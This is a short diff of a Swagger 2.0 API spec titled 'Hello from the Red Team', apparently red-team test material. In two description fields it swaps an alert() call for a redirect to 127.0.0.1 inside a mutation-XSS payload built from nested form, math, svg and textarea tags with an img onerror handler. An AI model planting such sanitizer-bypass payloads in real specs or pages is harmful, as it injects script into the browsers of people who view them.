@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: Hell from the Red Team
+  title: Hello from the Red Team
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=document.location.href='https://127.0.0.1/?hi' src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=document.location.href='https://127.0.0.1/?blah' src=1>"></form>
 
           format: int64
           in: path
